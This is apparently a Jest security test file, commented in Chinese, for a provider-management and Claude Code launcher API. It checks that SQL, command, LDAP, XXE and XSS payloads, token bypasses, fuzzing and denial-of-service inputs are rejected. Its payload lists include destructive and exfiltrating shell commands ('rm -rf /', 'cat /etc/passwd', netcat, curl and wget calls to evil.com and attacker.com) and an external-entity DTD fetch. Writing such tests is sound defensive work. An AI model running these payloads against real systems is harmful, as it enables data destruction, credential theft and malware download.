/**
 * Security Tests - Penetration Testing Scenarios
 * 模拟渗透测试场景和攻击向量
 */

import { api } from '@/services/api.mock';
import type { Provider, CreateProviderRequest, LaunchConfig } from '@/types';

describe('Security: Penetration Testing Scenarios', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('Injection Attack Vectors', () => {
    it('should prevent SQL injection attempts', async () => {
      const sqlInjectionPayloads = [
        // 经典SQL注入
        "'; DROP TABLE providers; --",
        "' OR '1'='1",
        "' OR 1=1 --",
        "' UNION SELECT * FROM users --",
        
        // 盲注尝试
        "' AND (SELECT COUNT(*) FROM providers) > 0 --",
        "' AND SLEEP(5) --",
        "' OR BENCHMARK(1000000,MD5(1)) --",
        
        // 二阶注入
        "admin'/**/union/**/select/**/password/**/from/**/users--",
        
        // NoSQL注入
        "'; return true; }//",
        "' || 'a'=='a",
        
        // 时间盲注
        "'; WAITFOR DELAY '00:00:05' --",
      ];

      for (const payload of sqlInjectionPayloads) {
        const maliciousProvider: CreateProviderRequest = {
          name: `Test ${payload}`,
          baseUrl: `https://api.example.com${payload}`,
          authToken: `token${payload}`,
          model: `model${payload}`,
          description: payload,
        };

        // 应该被拒绝或安全处理
        try {
          await api.addProvider(maliciousProvider);
          
          // 如果添加成功，验证数据已被清理
          const providers = await api.getProviders();
          const addedProvider = providers[providers.length - 1];
          
          expect(addedProvider.name).not.toContain('DROP TABLE');
          expect(addedProvider.name).not.toContain('UNION SELECT');
          expect(addedProvider.baseUrl).toMatch(/^https:\/\/[a-zA-Z0-9.-]+/);
          
        } catch (error) {
          // 预期的安全错误
          expect(error).toBeInstanceOf(Error);
          expect(error.message).toMatch(/Invalid input|SQL injection detected|Security violation/i);
        }
      }
    });

    it('should prevent command injection attacks', async () => {
      const commandInjectionPayloads = [
        // Shell命令注入
        '; rm -rf /',
        '&& cat /etc/passwd',
        '| nc attacker.com 4444',
        '`whoami`',
        '$(id)',
        
        // PowerShell注入
        '; Get-Process',
        '& dir C:\\',
        
        // 环境变量注入
        '$HOME/../../../etc/passwd',
        '%USERPROFILE%\\..\\..\\Windows\\System32',
        
        // 管道和重定向
        ' > /tmp/malicious.log',
        ' 2>&1 | nc evil.com 9999',
        
        // 子Shell
        '$(curl evil.com/steal-data)',
        '`wget evil.com/malware`',
      ];

      for (const payload of commandInjectionPayloads) {
        const launchConfig: LaunchConfig = {
          sessionId: `session-${Date.now()}`,
          workingDirectory: `/tmp${payload}`,
          args: [`--config${payload}`, `--log-file${payload}`],
          envVars: {
            [`CUSTOM_PATH${payload}`]: `/usr/bin${payload}`,
            'MALICIOUS_VAR': payload,
          },
        };

        await expect(api.launchClaudeCode(launchConfig))
          .rejects
          .toThrow(/Command injection|Invalid configuration|Security violation/i);
      }
    });

    it('should prevent LDAP injection attempts', async () => {
      const ldapInjectionPayloads = [
        // LDAP过滤器注入
        '*)(cn=*',
        '*)(&(objectClass=*',
        '*))(|(cn=*',
        
        // 属性注入
        '*)(mail=*))%00',
        '*)(userPassword=*',
        
        // 通配符滥用
        '*',
        '?',
        '\\*',
        '\\?',
      ];

      for (const payload of ldapInjectionPayloads) {
        // 模拟LDAP查询场景（如用户搜索）
        const searchQuery = `name=${payload}`;
        
        // 在实际系统中，应该验证和清理LDAP输入
        expect(payload).toMatch(/\*|\?|\)|&|\|/); // 验证测试数据包含危险字符
      }
    });

    it('should prevent XML injection and XXE attacks', async () => {
      const xmlInjectionPayloads = [
        // XXE (XML External Entity)
        '<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>',
        
        // XML炸弹
        '<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;">]><test>&lol2;</test>',
        
        // 参数实体注入
        '<!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">%xxe;]>',
        
        // CDATA滥用
        '<![CDATA[<script>alert("XSS")</script>]]>',
        
        // XML注释注入
        '<!-- --><script>alert("XSS")</script><!-- -->',
      ];

      for (const payload of xmlInjectionPayloads) {
        const configXml = `<?xml version="1.0"?><config><provider><name>${payload}</name></provider></config>`;
        
        // 如果系统处理XML，应该安全处理这些载荷
        expect(configXml).toContain(payload);
        
        // 在实际实现中，应该禁用外部实体解析
        // 并验证XML结构的安全性
      }
    });
  });

  describe('Authentication Bypass Attempts', () => {
    it('should prevent token bypass attacks', async () => {
      const bypassAttempts = [
        // 空token
        '',
        null,
        undefined,
        
        // 特殊值
        'null',
        'undefined',
        'false',
        '0',
        
        // 格式化字符串攻击
        '%s',
        '%x',
        '%n',
        
        // JSON注入
        '{"admin": true}',
        '"},"admin":"true","valid":"',
        
        // 编码绕过
        '%20%20%20', // URL编码空格
        '\\u0020\\u0020', // Unicode空格
        '\x00\x00\x00', // 空字节
        
        // 长度攻击
        'A'.repeat(1000),
        'A'.repeat(65536),
      ];

      for (const token of bypassAttempts) {
        await expect(api.validateProviderConnection(
          'https://api.anthropic.com',
          token as string
        )).rejects.toThrow(/Invalid token|Authentication failed|Unauthorized/i);
      }
    });

    it('should prevent privilege escalation', async () => {
      // 尝试创建具有管理员权限的provider
      const privilegeEscalationAttempts = [
        {
          name: 'Admin Provider',
          baseUrl: 'https://api.anthropic.com',
          authToken: 'admin-bypass-token',
          model: 'claude-3-sonnet-20240229',
          // 尝试注入管理员权限
          isAdmin: true,
          role: 'administrator',
          permissions: ['read', 'write', 'delete', 'admin'],
        },
        {
          name: 'System Provider',
          baseUrl: 'https://api.anthropic.com',
          authToken: 'system-token',
          model: 'claude-3-sonnet-20240229',
          // 尝试系统级权限
          systemLevel: true,
          privileged: true,
          override: true,
        },
      ];

      for (const attempt of privilegeEscalationAttempts) {
        try {
          const provider = await api.addProvider(attempt as CreateProviderRequest);
          
          // 验证额外的权限字段被忽略
          expect(provider.hasOwnProperty('isAdmin')).toBe(false);
          expect(provider.hasOwnProperty('role')).toBe(false);
          expect(provider.hasOwnProperty('permissions')).toBe(false);
          expect(provider.hasOwnProperty('systemLevel')).toBe(false);
          expect(provider.hasOwnProperty('privileged')).toBe(false);
          expect(provider.hasOwnProperty('override')).toBe(false);
          
        } catch (error) {
          expect(error).toBeInstanceOf(Error);
          expect(error.message).toMatch(/Invalid fields|Unauthorized|Privilege escalation detected/i);
        }
      }
    });

    it('should prevent session hijacking', async () => {
      // 创建合法session
      const legitimateConfig: LaunchConfig = {
        sessionId: 'legitimate-session-12345',
        args: [],
        envVars: {},
      };

      try {
        await api.launchClaudeCode(legitimateConfig);
      } catch (error) {
        // 可能失败，但要测试session安全
      }

      // 尝试劫持session
      const hijackingAttempts = [
        'legitimate-session-12345', // 完全相同
        'legitimate-session-12346', // 近似猜测
        'session-12345', // 简化版本
        '../legitimate-session-12345', // 路径遍历
        'legitimate-session-12345\x00', // 空字节注入
      ];

      for (const sessionId of hijackingAttempts) {
        await expect(api.getProcessStatus(sessionId))
          .rejects
          .toThrow(/Invalid session|Unauthorized|Session not found/i);
      }
    });
  });

  describe('Input Fuzzing Attacks', () => {
    it('should handle malformed input gracefully', async () => {
      const malformedInputs = [
        // 控制字符
        '\x00\x01\x02\x03\x04\x05',
        '\x7F\x80\x81\x82',
        
        // 格式化字符串
        '%s%s%s%s%s%s%s%s%s%s',
        '%x%x%x%x%x%x',
        '%n%n%n%n',
        
        // 缓冲区溢出尝试
        'A'.repeat(10000),
        'A'.repeat(65536),
        'A'.repeat(1048576),
        
        // Unicode攻击
        '\uFFFF\uFFFE',
        '\u0000\u0001',
        '\uD800\uDC00', // UTF-16代理对
        
        // 特殊UTF-8序列
        '\xC0\x80', // 过长编码
        '\xE0\x80\x80',
        '\xF0\x80\x80\x80',
        
        // 混合编码
        'test\u0000test',
        'test\x00test',
        'test\n\r\t\btest',
      ];

      for (const input of malformedInputs) {
        try {
          await api.addProvider({
            name: input,
            baseUrl: 'https://api.anthropic.com',
            authToken: input,
            model: input,
          });
          
          // 如果成功，验证输入被清理
          const providers = await api.getProviders();
          const lastProvider = providers[providers.length - 1];
          
          // 不应该包含控制字符
          expect(lastProvider.name).toMatch(/^[\x20-\x7E\u00A0-\uFFFF]*$/);
          
        } catch (error) {
          expect(error).toBeInstanceOf(Error);
          expect(error.message).toMatch(/Invalid input|Malformed data|Encoding error/i);
        }
      }
    });

    it('should handle edge case numeric values', async () => {
      const edgeCaseNumbers = [
        Number.MAX_SAFE_INTEGER,
        Number.MIN_SAFE_INTEGER,
        Number.MAX_VALUE,
        Number.MIN_VALUE,
        Number.POSITIVE_INFINITY,
        Number.NEGATIVE_INFINITY,
        Number.NaN,
        0,
        -0,
        0.1 + 0.2, // 浮点精度问题
        Math.PI,
        Math.E,
        // 特殊整数
        2147483647, // 32位最大值
        -2147483648, // 32位最小值
        4294967295, // 无符号32位最大值
        9223372036854775807, // 64位最大值
      ];

      for (const num of edgeCaseNumbers) {
        try {
          // 测试数值在各种上下文中的处理
          const testId = num.toString();
          
          if (isFinite(num) && num >= 0) {
            // 只有有限正数可能被用作ID
            await api.getProviderById(testId);
          }
          
        } catch (error) {
          expect(error).toBeInstanceOf(Error);
          // 应该优雅处理无效数值
        }
      }
    });

    it('should handle concurrent attack vectors', async () => {
      const concurrentAttacks = Array.from({ length: 50 }, (_, i) => {
        const attackType = i % 5;
        
        switch (attackType) {
          case 0: // SQL注入
            return api.addProvider({
              name: `Attack${i}'; DROP TABLE providers; --`,
              baseUrl: 'https://api.anthropic.com',
              authToken: 'token',
              model: 'claude-3-sonnet-20240229',
            });
            
          case 1: // XSS
            return api.addProvider({
              name: `<script>alert('Attack${i}')</script>`,
              baseUrl: 'https://api.anthropic.com',
              authToken: 'token',
              model: 'claude-3-sonnet-20240229',
            });
            
          case 2: // 命令注入
            return api.launchClaudeCode({
              sessionId: `attack-session-${i}`,
              args: [`; rm -rf / #attack${i}`],
              envVars: {},
            });
            
          case 3: // 大数据攻击
            return api.addProvider({
              name: 'A'.repeat(10000),
              baseUrl: 'https://api.anthropic.com',
              authToken: 'B'.repeat(10000),
              model: 'claude-3-sonnet-20240229',
            });
            
          default: // 无效数据
            return api.validateProviderConnection(
              `https://invalid-${i}.com`,
              `invalid-token-${i}`
            );
        }
      });

      const results = await Promise.allSettled(concurrentAttacks);
      
      // 大部分攻击应该被阻止
      const rejectedCount = results.filter(r => r.status === 'rejected').length;
      expect(rejectedCount).toBeGreaterThan(concurrentAttacks.length * 0.8);
      
      // 系统应该保持稳定
      const healthCheck = await api.getProviders();
      expect(Array.isArray(healthCheck)).toBe(true);
    });
  });

  describe('Denial of Service Attacks', () => {
    it('should prevent resource exhaustion', async () => {
      const startTime = Date.now();
      let operationCount = 0;
      
      try {
        // 尝试快速大量操作
        const rapidOperations = Array.from({ length: 100 }, async (_, i) => {
          operationCount++;
          return api.addProvider({
            name: `DoS Test ${i}`,
            baseUrl: 'https://api.anthropic.com',
            authToken: `token-${i}`,
            model: 'claude-3-sonnet-20240229',
          });
        });

        await Promise.all(rapidOperations);
        
      } catch (error) {
        // 应该有速率限制或资源保护
        expect(error).toBeInstanceOf(Error);
        expect(error.message).toMatch(/Rate limit|Too many requests|Resource exhaustion/i);
      }

      const duration = Date.now() - startTime;
      
      // 操作不应该消耗过长时间
      expect(duration).toBeLessThan(30000); // 30秒内
      
      // 系统应该仍然响应
      const providers = await api.getProviders();
      expect(Array.isArray(providers)).toBe(true);
    });

    it('should handle memory exhaustion attacks', async () => {
      const initialMemory = process.memoryUsage().heapUsed;
      
      try {
        // 尝试创建大量大型对象
        const memoryAttacks = Array.from({ length: 10 }, () => {
          const largeData = 'X'.repeat(1000000); // 1MB字符串
          
          return api.addProvider({
            name: largeData,
            baseUrl: 'https://api.anthropic.com',
            authToken: largeData,
            model: 'claude-3-sonnet-20240229',
            description: largeData,
          });
        });

        await Promise.allSettled(memoryAttacks);
        
      } catch (error) {
        expect(error).toBeInstanceOf(Error);
      }

      // 强制垃圾回收
      if (global.gc) {
        global.gc();
      }

      const finalMemory = process.memoryUsage().heapUsed;
      const memoryIncrease = finalMemory - initialMemory;
      
      // 内存增长不应该过大
      expect(memoryIncrease).toBeLessThan(50 * 1024 * 1024); // 50MB限制
    });

    it('should prevent infinite loop attacks', async () => {
      const timeout = 5000; // 5秒超时
      
      const operations = [
        // 循环引用配置
        async () => {
          const circularConfig: any = { providers: [] };
          circularConfig.self = circularConfig;
          return api.importConfig(JSON.stringify(circularConfig));
        },
        
        // 深度嵌套配置
        async () => {
          const deepConfig = createDeeplyNestedConfig(1000);
          return api.importConfig(JSON.stringify(deepConfig));
        },
        
        // 大数组配置
        async () => {
          const largeArrayConfig = {
            providers: new Array(10000).fill({
              name: 'Test',
              baseUrl: 'https://api.anthropic.com',
              authToken: 'token',
              model: 'claude-3-sonnet-20240229',
            }),
          };
          return api.importConfig(JSON.stringify(largeArrayConfig));
        },
      ];

      for (const operation of operations) {
        const startTime = Date.now();
        
        try {
          await Promise.race([
            operation(),
            new Promise((_, reject) => 
              setTimeout(() => reject(new Error('Operation timeout')), timeout)
            ),
          ]);
          
        } catch (error) {
          const duration = Date.now() - startTime;
          expect(duration).toBeLessThan(timeout);
          expect(error).toBeInstanceOf(Error);
        }
      }
    });
  });

  describe('Side Channel Attacks', () => {
    it('should prevent timing attacks', async () => {
      const validToken = 'sk-ant-valid-token-12345';
      const invalidTokens = [
        'sk-ant-invalid-token-1',
        'sk-ant-invalid-token-12',
        'sk-ant-invalid-token-123',
        'sk-ant-invalid-token-1234',
        'sk-ant-invalid-token-12345', // 相同长度
        'invalid-token',
        '',
        validToken.slice(0, -1), // 少一个字符
        validToken + 'x', // 多一个字符
      ];

      const timings: number[] = [];
      
      for (const token of invalidTokens) {
        const startTime = Date.now();
        
        try {
          await api.validateAuthTokenFormat(token);
        } catch (error) {
          // 预期失败
        }
        
        timings.push(Date.now() - startTime);
      }
      
      // 验证时间应该相对一致（防止时序攻击）
      const avgTime = timings.reduce((a, b) => a + b) / timings.length;
      const variance = timings.reduce((sum, time) => sum + Math.pow(time - avgTime, 2), 0) / timings.length;
      const stdDev = Math.sqrt(variance);
      
      // 标准差不应该太大
      expect(stdDev).toBeLessThan(avgTime * 0.5); // 50%的变化阈值
    });

    it('should prevent information disclosure through error messages', async () => {
      const sensitiveOperations = [
        // 尝试访问不存在的provider
        () => api.getProviderById('non-existent-id'),
        
        // 无效认证信息
        () => api.validateProviderConnection('https://api.anthropic.com', 'invalid-token'),
        
        // 权限不足操作
        () => api.deleteProvider('protected-provider-id'),
        
        // 无效配置导入
        () => api.importConfig('{"invalid": "config"}'),
      ];

      for (const operation of sensitiveOperations) {
        try {
          await operation();
        } catch (error) {
          const errorMessage = error.message.toLowerCase();
          
          // 错误消息不应该透露敏感信息
          expect(errorMessage).not.toContain('password');
          expect(errorMessage).not.toContain('token');
          expect(errorMessage).not.toContain('secret');
          expect(errorMessage).not.toContain('key');
          expect(errorMessage).not.toContain('database');
          expect(errorMessage).not.toContain('sql');
          expect(errorMessage).not.toContain('internal');
          expect(errorMessage).not.toContain('system');
          expect(errorMessage).not.toContain('admin');
          
          // 应该是通用错误消息
          expect(
            errorMessage.includes('not found') ||
            errorMessage.includes('invalid') ||
            errorMessage.includes('unauthorized') ||
            errorMessage.includes('forbidden')
          ).toBe(true);
        }
      }
    });
  });
});

// 辅助函数
function createDeeplyNestedConfig(depth: number): any {
  if (depth <= 0) {
    return { providers: [], settings: {} };
  }
  
  return {
    nested: createDeeplyNestedConfig(depth - 1),
    providers: [],
    settings: {},
  };
}